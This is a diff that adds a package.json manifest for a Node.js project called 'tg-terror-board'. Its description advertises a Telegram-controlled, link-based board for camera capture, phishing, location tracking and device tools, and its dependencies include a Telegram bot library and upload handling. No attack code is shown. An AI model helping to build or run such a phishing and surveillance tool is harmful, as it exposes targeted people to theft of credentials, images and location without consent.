@@ -1,0 +1,19 @@
+{
+  "name": "tg-terror-board",
+  "version": "6.0.0",
+  "description": "Link-based control board — camera, phish, location, device tools, referral",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "dependencies": {
+    "node-telegram-bot-api": "^0.66.0",
+    "express": "^4.19.2",
+    "multer": "^1.4.5-lts.1",
+    "axios": "^1.7.2",
+    "body-parser": "^1.20.2"
+  }
+}
